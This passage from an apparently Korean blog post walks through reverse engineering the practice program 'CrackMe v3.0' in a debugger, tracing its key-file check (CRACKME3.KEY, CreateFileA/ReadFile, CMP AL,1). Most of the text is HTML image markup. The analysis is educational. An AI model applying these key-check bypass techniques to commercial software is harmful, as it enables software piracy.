165w,\n/static/e25a9c07173b1f1d212af20c0549a157/d9ecf/4.png 330w,\n/static/e25a9c07173b1f1d212af20c0549a157/32056/4.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/e25a9c07173b1f1d212af20c0549a157/32056/4.png\"\n            alt=\"Text string\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>모든 문자열을 조사했다. 문제에서 보였던 문구가 있는 주소들이 존재한다. 이들에게 중단점을 걸고 주변을 관찰해 보았다. 다음은 401191주소지 근처이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 12.121212121212121%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAdElEQVR42gXB0Q7BQBAF0KtrZ3RDWMG6206riSjal0r9gVfx/3/jHHwtjxxTnlIa7DUXHZHOWGaAWNTb3bCPfYz3EK7rTa/Sem+iptqINPhY9eDT2sm62b9/ciOOByABJ4C6upRlFULtHAtH56hKEapmEf4Bm1QJoS0aq3UAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/5f8dc312c0c33d63ebfee60030eca84a/c9b55/5.webp 165w,\n/static/5f8dc312c0c33d63ebfee60030eca84a/f2908/5.webp 330w,\n/static/5f8dc312c0c33d63ebfee60030eca84a/ff4b8/5.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/5f8dc312c0c33d63ebfee60030eca84a/04c57/5.png 165w,\n/static/5f8dc312c0c33d63ebfee60030eca84a/d9ecf/5.png 330w,\n/static/5f8dc312c0c33d63ebfee60030eca84a/32056/5.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/5f8dc312c0c33d63ebfee60030eca84a/32056/5.png\"\n            alt=\"cmp\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>CMP AL,1 이후 AL과 1이 같을 시 이 파트를 지나가는 것을 볼 수 있다. 다음은 40137F 주소지 근처이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.060606060606062%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA20lEQVR42n3NyU7DMBSFYfsmvh5iZ2icxo7j2E1LkCBISIhNF2zZAe//NIhhifj0b48OOZ2uIVzX9dq2+zQ93u8vc3z205PtHyhdKb0QshCS/i6lybk5zqNSIoS83cZDb4ZB13WJyACQ/MOnPPqU86J17eO6bUkrbWqjKlkUHEAWAEVRMoaInDFkjAPA7/jjvN6FHJbZHnrulu7cVV5VSkkhpKxGn0bvUk5+8nawxhhrrRCCfSOvKd24OAY/D0fy/oa7wwA4IDSUQOnbYzS6a5qfN0qBf0EpFefiEyj4EtcrB4wjAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/778057592a633d9600967fc9b166d228/c9b55/6.webp 165w,\n/static/778057592a633d9600967fc9b166d228/f2908/6.webp 330w,\n/static/778057592a633d9600967fc9b166d228/ff4b8/6.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/778057592a633d9600967fc9b166d228/04c57/6.png 165w,\n/static/778057592a633d9600967fc9b166d228/d9ecf/6.png 330w,\n/static/778057592a633d9600967fc9b166d228/32056/6.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/778057592a633d9600967fc9b166d228/32056/6.png\"\n            alt=\"function\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>이 문구가 뜨게 하는 부분이 하나의 함수로 이루어져 있음을 볼 수 있다. 함수의 시작은 주소 401362이다. 위의 401191 주소지 근처에서 여기로 이어지는 것을 볼 수 있다. 다시 401191주소지 근처로 돌아가서 CMP 구문에 중단점을 걸고 실행시켜 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 269px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.636363636363637%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAArklEQVR42o2NTQ6CMBgF3wdU2tpSMBFoaWuE4m9CPILe/1ImGncm+lazeJOBdX0LHIAIjMAeaIchjbt2uxFy7awdvB/TFKM3pum6ViuZ53nB2P1xRwjeAWeiE9GNKBAJKddScs6JSAhRVZXWWinFGOOcF0WeZRmAZVnQO2uB4yt7BSx+7y2nlBBj6Farg1Knpr5o1Zfl+0FEH/guzylhcL1pjI1hnKew86ap/y8/AVSPDP2KjCIMAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/bd9c2466d07685164673b23d1a5ede04/c9b55/7.webp 165w,\n/static/bd9c2466d07685164673b23d1a5ede04/9fef4/7.webp 269w\"\n              sizes=\"(max-width: 269px) 100vw, 269px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/bd9c2466d07685164673b23d1a5ede04/04c57/7.png 165w,\n/static/bd9c2466d07685164673b23d1a5ede04/98fe2/7.png 269w\"\n            sizes=\"(max-width: 269px) 100vw, 269px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/bd9c2466d07685164673b23d1a5ede04/98fe2/7.png\"\n            alt=\"EAX\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>AL은 EAX의 뒤의 8비트이므로 0E이다. EAX의 마지막 두 16진수가 01이 되어야 정답 판정을 받을 수 있을 것이다. 다음은 CMP AL,1 명령어가 있는 401188주소지의 이전 부분이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 599px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.03030303030303%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA/ElEQVR42jXGy07CQBgG0G/qzLRz+9uR0hZoh96Q7lgZgQRXuDBGV+7UjTHx/d/ABGJyFgdNU4+bfj0v3ce3f3tKa2E2TjXKNNqOJptSFLiRuoypYigZW0VRwjkXIooirOra+5QMxd3k2tXMktNklHHKknZKKABSmmUz0Mw77/NFFdZhu90ulguEthvHfqqD+PqRr+fboGjKXEfpQOlEjBiAOKFd2Aw66TNf5Lm1tiyroijR923bN10xZ5+/9P6SBZ6MSRKk6mI1SrZk4BDSTnm15mzQydxqGUtHxlqNLDsLcQRO4/3+bvcs+Al4ADsAF+x4ySNwAvb/Dtf8Act2GQHR3efaAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/cf3d0b6545e1f8f7bd4a13038447b73d/c9b55/8.webp 165w,\n/static/cf3d0b6545e1f8f7bd4a13038447b73d/f2908/8.webp 330w,\n/static/cf3d0b6545e1f8f7bd4a13038447b73d/6407c/8.webp 599w\"\n              sizes=\"(max-width: 599px) 100vw, 599px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/cf3d0b6545e1f8f7bd4a13038447b73d/04c57/8.png 165w,\n/static/cf3d0b6545e1f8f7bd4a13038447b73d/d9ecf/8.png 330w,\n/static/cf3d0b6545e1f8f7bd4a13038447b73d/43142/8.png 599w\"\n            sizes=\"(max-width: 599px) 100vw, 599px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/cf3d0b6545e1f8f7bd4a13038447b73d/43142/8.png\"\n            alt=\"pop eax\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>POP EAX를 함으로써 CMP를 하기 직전 시점에서 스택의 가장 위에 있는 값을 EAX로 pop하는 것을 볼 수 있다. 즉 CMP하는 시점에서 스택의 맨 위의 값에 따라 키값의 여부가 결정된다고 결론내릴 수 있다. 이제부터 스택을 기준으로 분석을 하도록 하겠다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.484848484848484%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABDElEQVR42l2Ny04CMQBFbzsFwozzgnb6bucBQ0g0ISJEFy5Y4YaPMP7/PygaSfTkbO+58G4QjVSSp3k9Gbd5XWRZlqbzIs8ZSwA0TVBaee+kkvhHG0epVBdtuZDs/mEhZyy5wlhCCAFg7aof+hBDiKEoS0op+QUxjpyLNrpyIZP1xriE/K0LEYw1zhkheFHkP8Xb86aql+tVr12LOKQdQ0VAKUAJKEA4D0IqF6JxXindSKmUsc5pYxD8SjR8M3oTPJ6OpJ9gDeS4DqcAg9FhO9jOLjsn2lZ7L5Squ85U1RyXy0dZndp4bty5eHuv+tdMHzJ9vLPHqnsh5T6dncT0eZkcSrIHdsDjt7svPwFsDRrGDsXohgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/2f7ce5d3988d50de65b860f1f1e0d672/c9b55/9.webp 165w,\n/static/2f7ce5d3988d50de65b860f1f1e0d672/f2908/9.webp 330w,\n/static/2f7ce5d3988d50de65b860f1f1e0d672/ff4b8/9.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/2f7ce5d3988d50de65b860f1f1e0d672/04c57/9.png 165w,\n/static/2f7ce5d3988d50de65b860f1f1e0d672/d9ecf/9.png 330w,\n/static/2f7ce5d3988d50de65b860f1f1e0d672/32056/9.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/2f7ce5d3988d50de65b860f1f1e0d672/32056/9.png\"\n            alt=\"CreateWindowExA\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 384px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.242424242424235%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABX0lEQVR42o2P227UMBRFncnNiT2xPUnsE18SJ3YmhbY/xROXEYyE6B/BA/DS9gerSoOoVAmxHrfO0t4HPdw//vr988f3ez/faX2y5gTwNcY7Y85te3Ljl6urb4M+d90nQj5K+XnyZwkflHyfpe8QgIprNGatiQjB+9lJ6fsepOwatt83e2sGUIrSWjzDD4InCbog+877SSlf1XwcjbUDF0YpULKjlHLOhBCMMSE4Y03DGiFYWZYXWWuIa9A6UnpY1xDXBdSCMSGkxhjX1R9whTEuMSaUZll2kZXs53kydg3xjdHgvW+7qSzrqsJ5nqdpWhR5lqZ5UWCMizxP/o5GSA8QwmLdFuNb78cYZ6nmXj7/zFhTE9K2B0oIY1zKnrFmt3shA8gQF+fWGK+nyYXghbAIvbj4B6Dksvhx3I7HG2vBuYFzg9AueaUnr6NhgG3bYrw9Hm+myS7L2B7cfzY/Abm0K4zZ20IyAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/52e1fef7788a36491dd2301cd3b940fd/c9b55/10.webp 165w,\n/static/52e1fef7788a36491dd2301cd3b940fd/f2908/10.webp 330w,\n/static/52e1fef7788a36491dd2301cd3b940fd/e6f2f/10.webp 384w\"\n              sizes=\"(max-width: 384px) 100vw, 384px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/52e1fef7788a36491dd2301cd3b940fd/04c57/10.png 165w,\n/static/52e1fef7788a36491dd2301cd3b940fd/d9ecf/10.png 330w,\n/static/52e1fef7788a36491dd2301cd3b940fd/804b2/10.png 384w\"\n            sizes=\"(max-width: 384px) 100vw, 384px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/52e1fef7788a36491dd2301cd3b940fd/804b2/10.png\"\n            alt=\"stack\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>CreateWindowExA 함수를 지난 후의 스택이다. 401159 주소지의 PUSH 0040210E WindowName = “CrackMe v3.0 - Uncracked”가 그대로 최종 스택이 됨을 볼 수 있다. 이제부터 40210E를 추적해 가며 관찰해 보도록 하겠다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35.75757575757576%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABUklEQVR42j2Ly2rcMBhGf40944tsp/JIlmxLsnWzx3ZJCIE2kHZXSumuFEqzCMmu2+YJ+uolE8jh8G0OHzw//73//TQaN89+GM3x1wPbeuIviCe1q4+eZApLrU+UzZSO5F2aprgo8BkwRgmhKOMhWGOtuLzRrieUHJuatZTUBQBKkrLCOEuSEmNcFPDGskzjMFEmOKdpmkd+ycrorSL0sm07GmeHQa/rwnlzDuc8z0EpT5kQgiVpvnNzQaIkff0hdH5zMRjnOtlv2xqmELzXWkutYdncaDxjzbra0erd9x8X73G2ADCAElANEEND+InXqsqV5MbKVtRVleX5Hq6nu2n4TOlV113j3N7+/FatJ6ACWA+JhJ0EpKOdPcQy2as4lgi1AK928O/q66P9opqPwX7i/Yf9nydYPQQFnYHIATgAfzhsuDiV1VpVSxwHAI/Qi/8BKFYlZwkUTLkAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/776414fcde6a39cfdfc381536c211848/c9b55/11.webp 165w,\n/static/776414fcde6a39cfdfc381536c211848/f2908/11.webp 330w,\n/static/776414fcde6a39cfdfc381536c211848/ff4b8/11.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/776414fcde6a39cfdfc381536c211848/04c57/11.png 165w,\n/static/776414fcde6a39cfdfc381536c211848/d9ecf/11.png 330w,\n/static/776414fcde6a39cfdfc381536c211848/32056/11.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/776414fcde6a39cfdfc381536c211848/32056/11.png\"\n            alt=\"entry point\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>Entry point 지점이다. CreateFileA 함수를 지난 후 401037주소지에서 PUSH 20.0040210E를 하는 부분이 있다. “CrackMe v3.0” 뒤에 공백으로 되어 있지만 바로 아래의 4012F5함수를 지나고 나면 아래와 같이 “Uncracked”라는 문자열이 붙는다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 514px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 11.515151515151516%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAb0lEQVR42jXBQQrCMBBA0Z/JDHEaqK12p4KgC10UEWsMuBV6E0/heTynK9/j9b7IKbOHA2whQeDPFp67pTWNrgdv25RSVJOuT/3K3RW+H8rM7szxymYkj4QJJrhBFXmqFpFiVmN8iJQQ7qpVtYqUH9uJCJv7SrYlAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/fdcc718fb78d221d1383ea97d490975d/c9b55/12.webp 165w,\n/static/fdcc718fb78d221d1383ea97d490975d/f2908/12.webp 330w,\n/static/fdcc718fb78d221d1383ea97d490975d/7a333/12.webp 514w\"\n              sizes=\"(max-width: 514px) 100vw, 514px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/fdcc718fb78d221d1383ea97d490975d/04c57/12.png 165w,\n/static/fdcc718fb78d221d1383ea97d490975d/d9ecf/12.png 330w,\n/static/fdcc718fb78d221d1383ea97d490975d/dea13/12.png 514w\"\n            sizes=\"(max-width: 514px) 100vw, 514px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/fdcc718fb78d221d1383ea97d490975d/dea13/12.png\"\n            alt=\"Uncracked\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>함수 4012F5함수를 조사하였다. 아래는 함수 4012F5이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 553px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.363636363636363%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAqklEQVR42j3CWwqCQBQA0Osjysm5o6MTOjOahmZBGFmW9RNROwhX0APa/wbqq8OB1/Pxfn/q+k7xlOgrcY487Barc57fhGgJ2VPaMrZ1x41hrAEa2+6I01B3Z9sb8DlyP5yIhHlEykAlopqVZSqrZaqUiGOeZZGUpCigmoNpWgAj+NM6TvU0ijJExjyfDh1xuPC+DzzOPB+RcR4gYhCaWhmWNQAgAAaA+fsFvq8RO6Bz3X4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/9541758657cab3738bddf2ec69347bde/c9b55/13.webp 165w,\n/static/9541758657cab3738bddf2ec69347bde/f2908/13.webp 330w,\n/static/9541758657cab3738bddf2ec69347bde/e58ce/13.webp 553w\"\n              sizes=\"(max-width: 553px) 100vw, 553px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/9541758657cab3738bddf2ec69347bde/04c57/13.png 165w,\n/static/9541758657cab3738bddf2ec69347bde/d9ecf/13.png 330w,\n/static/9541758657cab3738bddf2ec69347bde/74cfa/13.png 553w\"\n            sizes=\"(max-width: 553px) 100vw, 553px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/9541758657cab3738bddf2ec69347bde/74cfa/13.png\"\n            alt=\"4012F5\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>“CrackMe v3.0”이라는 문자열이 들어 있는 40210E의 뒤에 Little Endian 방식으로 55202D20( - U), 6172636E(ncra), 64656B63(cked)라는 문자열을 쌓고 있다. 이 문자열들은 함수 4012F5 이전의 과정에서 온 것으로 보인다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.72727272727272%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABwUlEQVR42mWS3XLbIBCF10YCZAn0jwQyIAlL/otb15m005le56KdiXORtI/Q93+DVm4ynqTfnDs47GF34fH8q6qV1SrTNnx8Yk1AlzSo6KJZ4NqD2F8WlaTEcB4iBO+opamlGkdnelcfjkqXiUgykQmVL2IMyEtYmseMUZqnCcb4jVlrV4o6S2NEI88NhLx73O/6USlpu3bcrAl5Mc8uQGsG1eilqgKeoe02LgCHl+MXszeu963rhnH4dDru99uus9poIco45iD1UJbVyrXSrYKHM3Oe1wMks9kkAOSbQloeCcZqJaWUURTRIEAITZUPuheVkLJIC3b7fMAdghogB5j/q+4TTCmeU+IhNH/N/Pqnn+6szf3Q/SiHe/T7yd/c4M0RqwMN7rB/C3Ai5CuhdxH7RoMv89kR4ONFHyYt9Y2pnG23SzOudntje8pTmuRhJCjNABKACAADEIAFQAAQXtXblVVKqYJnOdsdmCRTZnrtttbWWCVE1jRVmrLZNTSA68amrDhnQZyS02dlaz/wMZm4XPPGcdd1bTMhizx/M0ez7FUh+s6a9Wbx/SHrEu543MaJ4940M78Kk8L3yH8L8Jc/hcIrtBL19GIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/85208abf9c12bde8ee6f04585c086339/c9b55/14.webp 165w,\n/static/85208abf9c12bde8ee6f04585c086339/f2908/14.webp 330w,\n/static/85208abf9c12bde8ee6f04585c086339/ff4b8/14.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/85208abf9c12bde8ee6f04585c086339/04c57/14.png 165w,\n/static/85208abf9c12bde8ee6f04585c086339/d9ecf/14.png 330w,\n/static/85208abf9c12bde8ee6f04585c086339/32056/14.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/85208abf9c12bde8ee6f04585c086339/32056/14.png\"\n            alt=\"restart\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>다시 실행시켜서 처음부터 한줄씩 실행시켜 보았다. CreateFileA함수를 지난 후 CMP EAX,-1을 하여 같지 않으면 401043주소지로 jump하는데, 40210E의 문자열 뒤에 Uncracked라는 문자열이 붙고 401041주소지에서 JUMP가 발생하여 ReadFile함수를 실행하지 않게 되는 것을 확인하였다. 인위적으로 CreateFileA의 인자로 들어가는 “CRACKME3.KEY”라는 이름의 파일을 생성한 후 임의의 문자열 “12345”를 해당 파일에 저장한 후 다시 실행시켜 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 94px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 97.8723404255319%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAIAAAAC64paAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADKUlEQVR42lVTWXPiRhD+eoRuxLHGYCNxCGEuAbYRtzEgDsMas9i79iZV+7aVyltSlcf8+9SM1lXOV/3Q0zPfzNc93cjl7Vaj5jgFx75wSwUQdKAM2MIcYTZQAHLCvwMyQBYCvaCzXi/D9SZcr8LZFECR6Ag8AVtgBxyBB2ANBMAK+CnizxE5k8212+2W7/tt3y0XGGPRy8UPj0dOHbgGbgAPqEZkWdEs09Q0PRE3dU0DQQUSgAaYwCcgDSSBFCCBbyWBOHhqHP3R4MdvX64azeFkctytwK+nf4E34A/gL+AfobMHPAJ/iuVavM9RcsvjUa9YKl816v3bDojrPIrTY2Av0h4Lwdci+Q1wL/LiIEmRZUXXdE3VZFkhIhKa5XcjYTLAhKMBMbHk8NvNzWbpd7uL+8ndKAD/EpoDU2ABzISEobA9MAf6Iu5H5Hanud6E3V4QhvPlbAzgkmjL2JaxMePOd8YeJWkhSUfG5ozuGNszdsP1Cdk6h6Gpmq7rjPGwKQobiY+KLAOKMON9KyqYGwTXt/1ex2/WqxUApmWVq27JtS/ydqVacwqO320PBjdOyS44eadcLFUKuewZJ48mg7e309Pzy/e3l+Pjluecy4bhXTjv+1f16fR+d9i+PIa/vx76QWfW60wng3A1bnsuJyuqlk6nk8lU0rISSYsRmCzr8bhq6IaViCeTimmYqZR19klPJBRDV824bhiqLoSfnedct5jJZfN2vlQsQOSTF61/LtrrUnToNdACOqJtLeDsfTC6u4f5zTBYh8vNagHGjx4YeybqEd0SC4n+FhUOGZ2IHoheGB2iaucubb9Zc4qlStnNX/BRs4hqhArBFW3oAA2gIswWU1Ej+vXPUkw2DF03dDkma5rK+0mSZE2VFCWmqhSLyYrCZMW0LN2MG/G4rCiQJMQkTh5Ohq/fvpxevz4ddvvPvNrnmcxsPp7NgqZXrnnl3mD8vN9+Pn1dPpx2+3B5v1gtZ5PbFid7Ve9+Pg0Go/lk7LfqAFLptO83Wg2vUip0/Kbn1UeDoFKtebWWY1/6rW6367ebvyYafBYIHyEiRPS/SISP5/4DIG5laOul9KIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/92edcb95c24f6fed90dbae32c0291b2d/1edfe/15.webp 94w\"\n              sizes=\"(max-width: 94px) 100vw, 94px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/92edcb95c24f6fed90dbae32c0291b2d/37939/15.png 94w\"\n            sizes=\"(max-width: 94px) 100vw, 94px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/92edcb95c24f6fed90dbae32c0291b2d/37939/15.png\"\n            alt=\"EAX\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>EAX가 FFFFFFFF가 아닌 1E4가 됨으로써 401035주소지에서 jump를 하여 4012F5함수를 실행하지 않고, 뒤이어 401041주소지에서 jump를 수행하지 않아 ReadFile을 수행하는 것을 관찰하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.060606060606062%; position: relative; bottom: 0; left: 0; background-image: 